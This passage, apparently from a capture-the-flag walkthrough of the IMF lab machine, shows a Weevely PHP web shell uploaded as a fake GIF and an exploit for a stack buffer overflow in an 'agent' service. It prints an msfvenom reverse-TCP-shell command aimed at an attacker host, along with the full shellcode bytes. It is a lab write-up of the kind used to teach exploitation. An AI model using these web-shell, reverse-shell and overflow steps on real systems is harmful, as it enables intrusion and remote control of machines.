</span><span class='line'>Generated 'harmless.php' with password 'securepass' of 695 byte size.</span></code></pre></td></tr></table></div></figure>


<p>I appended the GIF magic number at the beginning and changed the extension to GIF and successfully uploaded the shell. Then I connected to it with the Weevely client:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./weevely.py http://192.168.145.130/imfadministrator/uploads/c2fff7999be7.gif securepass
</span><span class='line'>
</span><span class='line'>[+] weevely 3.6.2
</span><span class='line'>
</span><span class='line'>[+] Target:   192.168.145.130
</span><span class='line'>[+] Session:  /root/.weevely/sessions/192.168.145.130/c2fff7999be7_0.session
</span><span class='line'>
</span><span class='line'>[+] Browse the filesystem or execute commands starts the connection
</span><span class='line'>[+] to the target. Type :help for more information.
</span><span class='line'>
</span><span class='line'>weevely&gt; :help
</span><span class='line'>
</span><span class='line'> :audit_disablefunctionbypass  Bypass disable_function restrictions with mod_cgi and .htaccess.     
</span><span class='line'> :audit_phpconf                Audit PHP configuration.                                             
</span><span class='line'> :audit_suidsgid               Find files with SUID or SGID flags.                                  
</span><span class='line'> :audit_filesystem             Audit the file system for weak permissions.                          
</span><span class='line'> :audit_etcpasswd              Read /etc/passwd with different techniques.                          
</span><span class='line'> :shell_php                    Execute PHP commands.                                                
</span><span class='line'> :shell_sh                     Execute shell commands.                                              
</span><span class='line'> :shell_su                     Execute commands with su.                                            
</span><span class='line'> :system_extensions            Collect PHP and webserver extension list.                            
</span><span class='line'> :system_info                  Collect system information.                                          
</span><span class='line'> :system_procs                 List running processes.                                              
</span><span class='line'> :backdoor_reversetcp          Execute a reverse TCP shell.                                         
</span><span class='line'> :backdoor_meterpreter         Start a meterpreter session.                                         
</span><span class='line'> :backdoor_tcp                 Spawn a shell on a TCP port.                                         
</span><span class='line'> :bruteforce_sql               Bruteforce SQL database.                                             
</span><span class='line'> :file_upload2web              Upload file automatically to a web folder and get corresponding URL. 
</span><span class='line'> :file_upload                  Upload file to remote filesystem.                                    
</span><span class='line'> :file_read                    Read remote file from the remote filesystem.                         
</span><span class='line'> :file_cp                      Copy single file.                                                    
</span><span class='line'> :file_clearlog                Remove string from a file.                                           
</span><span class='line'> :file_gzip                    Compress or expand gzip files.                                       
</span><span class='line'> :file_tar                     Compress or expand tar archives.                                     
</span><span class='line'> :file_enum                    Check existence and permissions of a list of paths.                  
</span><span class='line'> :file_ls                      List directory content.                                              
</span><span class='line'> :file_check                   Get attributes and permissions of a file.                            
</span><span class='line'> :file_find                    Find files with given names and attributes.                          
</span><span class='line'> :file_download                Download file from remote filesystem.                                
</span><span class='line'> :file_rm                      Remove remote file.                                                  
</span><span class='line'> :file_touch                   Change file timestamp.                                               
</span><span class='line'> :file_cd                      Change current working directory.                                    
</span><span class='line'> :file_webdownload             Download an URL.                                                     
</span><span class='line'> :file_mount                   Mount remote filesystem using HTTPfs.                                
</span><span class='line'> :file_grep                    Print lines matching a pattern in multiple files.                    
</span><span class='line'> :file_zip                     Compress or expand zip files.                                        
</span><span class='line'> :file_bzip2                   Compress or expand bzip2 files.                                      
</span><span class='line'> :file_edit                    Edit remote file on a local editor.                                  
</span><span class='line'> :sql_dump                     Multi dbms mysqldump replacement.                                    
</span><span class='line'> :sql_console                  Execute SQL query or run console.                                    
</span><span class='line'> :net_phpproxy                 Install PHP proxy on the target.                                     
</span><span class='line'> :net_curl                     Perform a curl-like HTTP request.                                    
</span><span class='line'> :net_mail                     Send mail.                                                           
</span><span class='line'> :net_proxy                    Run local proxy to pivot HTTP/HTTPS browsing through the target.     
</span><span class='line'> :net_ifconfig                 Get network interfaces addresses.                                    
</span><span class='line'> :net_scan                     TCP Port scan.                                                       
</span><span class='line'>
</span><span class='line'>The system shell interpreter is not available in this session, use the
</span><span class='line'>following command replacements to simulate a unrestricted shell.
</span><span class='line'>
</span><span class='line'> touch                                      file_touch       
</span><span class='line'> whoami, hostname, pwd, uname               system_info      
</span><span class='line'> gzip, gunzip                               file_gzip        
</span><span class='line'> mail                                       net_mail         
</span><span class='line'> curl                                       net_curl         
</span><span class='line'> zip, unzip                                 file_zip         
</span><span class='line'> nmap                                       net_scan         
</span><span class='line'> cd                                         file_cd          
</span><span class='line'> rm                                         file_rm          
</span><span class='line'> ps                                         system_procs     
</span><span class='line'> cat                                        file_read        
</span><span class='line'> ifconfig                                   shell_su         
</span><span class='line'> vi, vim, emacs, nano, pico, gedit, kwrite  file_edit        
</span><span class='line'> wget                                       file_webdownload 
</span><span class='line'> find                                       file_find        
</span><span class='line'> tar                                        file_tar         
</span><span class='line'> ifconfig                                   net_ifconfig     
</span><span class='line'> bzip2, bunzip2                             file_bzip2       
</span><span class='line'> ls, dir                                    file_ls          
</span><span class='line'> cp, copy                                   file_cp          
</span><span class='line'> grep                                       file_grep  </span></code></pre></td></tr></table></div></figure>


<p>Now let&rsquo;s use it to poke around:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>weevely&gt; whoami
</span><span class='line'>www-data
</span><span class='line'>www-data@imf:/var/www/html/imfadministrator/uploads $ :system_info
</span><span class='line'>+--------------------+-------------------------------------------------------------------------------+
</span><span class='line'>| client_ip          | 192.168.145.129                                                               |
</span><span class='line'>| max_execution_time | 30                                                                            |
</span><span class='line'>| script             | /imfadministrator/uploads/c2fff7999be7.gif                                    |
</span><span class='line'>| open_basedir       |                                                                               |
</span><span class='line'>| hostname           | imf                                                                           |
</span><span class='line'>| php_self           | /imfadministrator/uploads/c2fff7999be7.gif                                    |
</span><span class='line'>| script_folder      | /var/www/html/imfadministrator/uploads                                        |
</span><span class='line'>| uname              | Linux imf 4.4.0-45-generic #66-Ubuntu SMP Wed Oct 19 14:12:37 UTC 2016 x86_64 |
</span><span class='line'>| pwd                | /var/www/html/imfadministrator/uploads                                        |
</span><span class='line'>| safe_mode          | False                                                                         |
</span><span class='line'>| php_version        | 7.0.32-0ubuntu0.16.04.1                                                       |
</span><span class='line'>| dir_sep            | /                                                                             |
</span><span class='line'>| os                 | Linux                                                                         |
</span><span class='line'>| whoami             | www-data                                                                      |
</span><span class='line'>| document_root      | /var/www/html                                                                 |
</span><span class='line'>+--------------------+-------------------------------------------------------------------------------+</span></code></pre></td></tr></table></div></figure>


<p>Listing the files in the current directory gives us the fifth flag!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@imf:/var/www/html/imfadministrator/uploads $ ls -alh
</span><span class='line'>total 28K
</span><span class='line'>drwxr-xr-x 2 www-data www-data 4.0K Oct  7 07:29 .
</span><span class='line'>drwxr-xr-x 4 www-data www-data 4.0K Oct 17  2016 ..
</span><span class='line'>-rw-r--r-- 1 www-data www-data   82 Oct 12  2016 .htaccess
</span><span class='line'>-rw-r--r-- 1 www-data www-data  701 Oct  7 07:29 c2fff7999be7.gif
</span><span class='line'>-rw-r--r-- 1 www-data www-data   30 Oct  7 07:03 c72ad31b04e6.gif
</span><span class='line'>-rw-r--r-- 1 www-data www-data   30 Oct  7 06:47 d8988628c59f.gif
</span><span class='line'>-rw-r--r-- 1 www-data www-data   28 Oct 12  2016 flag5_abc123def.txt
</span><span class='line'>
</span><span class='line'>$ cat flag5_abc123def.txt
</span><span class='line'>flag5{YWdlbnRzZXJ2aWNlcw==}</span></code></pre></td></tr></table></div></figure>


<p>The decoded hint is <code>agentservices</code></p>

<h1>Flag #6 &ndash; Binary exploitation</h1>

<p>I ran a search on the filesystem for files with agent in their name and got 2 hits:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>find / -type f -name agent* 
</span><span class='line'>/usr/local/bin/agent
</span><span class='line'>/etc/xinetd.d/agent</span></code></pre></td></tr></table></div></figure>


<p>Interestingly, it seems there is an agent server around:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/xinetd.d/agent
</span><span class='line'># default: on
</span><span class='line'># description: The agent server serves agent sessions
</span><span class='line'># unencrypted agentid for authentication.
</span><span class='line'>service agent
</span><span class='line'>{
</span><span class='line'>       flags          = REUSE
</span><span class='line'>       socket_type    = stream
</span><span class='line'>       wait           = no
</span><span class='line'>       user           = root
</span><span class='line'>       server         = /usr/local/bin/agent
</span><span class='line'>       log_on_failure += USERID
</span><span class='line'>       disable        = no
</span><span class='line'>       port           = 7788
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>So it seems the agent service is listening on port 7788 and running as root:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>netstat -lnt
</span><span class='line'>Active Internet connections (only servers)
</span><span class='line'>Proto Recv-Q Send-Q Local Address           Foreign Address         State      
</span><span class='line'>tcp        0      0 0.0.0.0:7788            0.0.0.0:*               LISTEN  </span></code></pre></td></tr></table></div></figure>


<p>Next I went to <code>/usr/local/bin</code> where the executable is located:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./agent
</span><span class='line'>  ___ __  __ ___ 
</span><span class='line'> |_ _|  \/  | __|  Agent
</span><span class='line'>  | || |\/| | _|   Reporting
</span><span class='line'> |___|_|  |_|_|    System
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Agent ID : </span></code></pre></td></tr></table></div></figure>


<p>We need to give it a valid agent ID for authentication. Inside the folder there is also another file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@imf:/usr/local/bin $ cat access_codes
</span><span class='line'>SYN 7482,8279,9467</span></code></pre></td></tr></table></div></figure>


<p>Looks like a port knocking sequence. I borrowed from an example on <a href="https://wiki.archlinux.org/index.php/Port_knocking">ArchLinux wiki</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>for port in 7482 8279 9467; do nmap -Pn --host-timeout 100 --max-retries 0 -p $port 192.168.145.130; done</span></code></pre></td></tr></table></div></figure>


<p>And when I ran Nmap again, I found port 7788 is now open to the public:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT     STATE SERVICE
</span><span class='line'>7788/tcp open  unknown</span></code></pre></td></tr></table></div></figure>


<p>Connecting to it takes us to the agent prompt where we have to put the agent ID. I downloaded the agent executable on my system for GDB:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@imf:/usr/local/bin $ :file_download agent /root/agent</span></code></pre></td></tr></table></div></figure>


<p>Running strings on it also gives some interesting infomation about extraction points. Anyway, back to the agent ID. In the strings I saw a call to <strong>strncmp</strong>, so when running the executable I set up a breakpoint on main, then ran the program, set a breakpoint to strncmp and gave it some input. Doing so, I noticed what appears to be a hardcoded value in the comparison:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0000| 0xffffd32c --&gt; 0x80486bf (&lt;main+196&gt;: add    esp,0x10)
</span><span class='line'>0004| 0xffffd330 --&gt; 0xffffd34e ("1234\n")
</span><span class='line'>0008| 0xffffd334 --&gt; 0x804c1d0 ("48093572")
</span><span class='line'>0012| 0xffffd338 --&gt; 0x8 
</span><span class='line'>0016| 0xffffd33c --&gt; 0xf7de4e6b (add    esp,0x10)
</span><span class='line'>0020| 0xffffd340 --&gt; 0xf7f8a3fc --&gt; 0xf7f8b200 --&gt; 0x0 
</span><span class='line'>0024| 0xffffd344 --&gt; 0x0 
</span><span class='line'>0028| 0xffffd348 --&gt; 0x804c1d0 ("48093572")</span></code></pre></td></tr></table></div></figure>


<p>I used 48093572 as the agent ID and it worked and took me to a menu:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vn 192.168.145.130 7788
</span><span class='line'>(UNKNOWN) [192.168.145.130] 7788 (?) open
</span><span class='line'>  ___ __  __ ___ 
</span><span class='line'> |_ _|  \/  | __|  Agent
</span><span class='line'>  | || |\/| | _|   Reporting
</span><span class='line'> |___|_|  |_|_|    System
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Agent ID : 48093572
</span><span class='line'>Login Validated 
</span><span class='line'>Main Menu:
</span><span class='line'>1. Extraction Points
</span><span class='line'>2. Request Extraction
</span><span class='line'>3. Submit Report
</span><span class='line'>0. Exit
</span><span class='line'>Enter selection: 1
</span><span class='line'>
</span><span class='line'>Extraction Points:
</span><span class='line'>Staatsoper, Vienna, Austria
</span><span class='line'>Blenheim Palace, Woodstock, Oxfordshire, England, UK
</span><span class='line'>Great Windmill Street, Soho, London, England, UK
</span><span class='line'>Fawley Power Station, Southampton, England, UK
</span><span class='line'>Underground Station U4 Schottenring, Vienna, Austria
</span><span class='line'>Old Town Square, Old Town, Prague, Czech Republic
</span><span class='line'>Drake Hotel - 140 E. Walton Pl., Near North Side, Chicago, Illinois, USA
</span><span class='line'>Ashton Park, Mosman, Sydney, New South Wales, Australia
</span><span class='line'>Argyle Place, The Rocks, Sydney, New South Wales, Australia
</span><span class='line'>
</span><span class='line'>Enter selection: 2
</span><span class='line'>
</span><span class='line'>Extraction Request
</span><span class='line'>Enter extraction location: Vienna
</span><span class='line'>
</span><span class='line'>Location: Vienna
</span><span class='line'>
</span><span class='line'>Extraction team has been deployed.
</span><span class='line'>
</span><span class='line'>Enter selection: 3
</span><span class='line'>
</span><span class='line'>Enter report update: Abort extraction
</span><span class='line'>Report: Abort extraction
</span><span class='line'>Submitted for review.</span></code></pre></td></tr></table></div></figure>


<p>Interesting. The 3rd option is the one that appears to take a variable amount of input, so maybe there&rsquo;s a buffer overflow lurking around. It&rsquo;s been a while since I&rsquo;ve done any binary exploitation. First thing, creating the pattern that might crash the service:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
</span><span class='line'>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B</span></code></pre></td></tr></table></div></figure>


<p>I used the above string for the report and the program did crash:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>
</span><span class='line'>[----------------------------------registers-----------------------------------]
</span><span class='line'>EAX: 0xffffd294 ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af\224\322\377\377Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"...)
</span><span class='line'>EBX: 0x0 
</span><span class='line'>ECX: 0xf7f8adc7 --&gt; 0xf8b8900a 
</span><span class='line'>EDX: 0xf7f8b890 --&gt; 0x0 
</span><span class='line'>ESI: 0xf7f8a000 --&gt; 0x1d5d8c 
</span><span class='line'>EDI: 0x0 
</span><span class='line'>EBP: 0x35664134 ('4Af5')
</span><span class='line'>ESP: 0xffffd340 ("f7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3"...)
</span><span class='line'>EIP: 0x41366641 ('Af6A')
</span><span class='line'>EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
</span><span class='line'>[-------------------------------------code-------------------------------------]
</span><span class='line'>Invalid $PC address: 0x41366641</span></code></pre></td></tr></table></div></figure>


<p>With my binary exploitation skills unused in a long time, I had to revisit some topics and also take a look at how others solved this. Moving on, a couple of interesting things, EIP gets overwritten by Af6A, which appears at offset 168 of the payload:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./pattern_offset.rb -q Af6A -l 1000
</span><span class='line'>[*] Exact match at offset 168</span></code></pre></td></tr></table></div></figure>


<p>However, if we look at EAX, we see our pattern from the beginning. Which means that if we had some shellcode instead of the pattern, it would get stored in EAX, and to execute it we would need a JMP or a CALL instruction to EAX. Luckily, there&rsquo;s one available!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ jmpcall eax
</span><span class='line'>0x8048563 : call eax</span></code></pre></td></tr></table></div></figure>


<p>Now, for the shellcode part. The way of feeding it to the vulnerable program will be using a Python script. I chose a reverse TCP shell for the payload and avoided badchars like nulls and newlines (line feeds and carriage returns):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.145.129 LPORT=8888 -f python -o killagent.py -b "\x00\x0a\x0d"
</span><span class='line'>[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
</span><span class='line'>[-] No arch selected, selecting arch: x86 from the payload
</span><span class='line'>Found 10 compatible encoders
</span><span class='line'>Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
</span><span class='line'>x86/shikata_ga_nai succeeded with size 95 (iteration=0)
</span><span class='line'>x86/shikata_ga_nai chosen with final size 95
</span><span class='line'>Payload size: 95 bytes
</span><span class='line'>Final size of python file: 470 bytes
</span><span class='line'>Saved as: killagent.py</span></code></pre></td></tr></table></div></figure>


<p>The payload size is 95 bytes:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat killagent.py 
</span><span class='line'>buf =  ""
</span><span class='line'>buf += "\xbb\x6e\x01\x4b\xcb\xdb\xcc\xd9\x74\x24\xf4\x5e\x31"
</span><span class='line'>buf += "\xc9\xb1\x12\x31\x5e\x12\x03\x5e\x12\x83\xa8\x05\xa9"
</span><span class='line'>buf += "\x3e\x05\xdd\xda\x22\x36\xa2\x77\xcf\xba\xad\x99\xbf"
</span><span class='line'>buf += "\xdc\x60\xd9\x53\x79\xcb\xe5\x9e\xf9\x62\x63\xd8\x91"
</span><span class='line'>buf += "\xb4\x3b\x8b\xe0\x5d\x3e\xac\xc0\x25\xb7\x4d\xb4\x30"
</span><span class='line'>buf += "\x98\xdc\xe7\x0f\x1b\x56\xe6\xbd\x9c\x3a\x80\x53\xb2"
</span><span class='line'>buf += "\xc9\x38\xc4\xe3\x02\xda\x7d\x75\xbf\x48\x2d\x0c\xa1"
</span><span class='line'>buf += "\xdc\xda\xc3\xa2"</span></code></pre></td></tr></table></div></figure>


<p>Under these conditions, we would need to send a buffer of the shellcode + padding + the address of the CALL EAX instruction. Let&rsquo;s see the Python:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
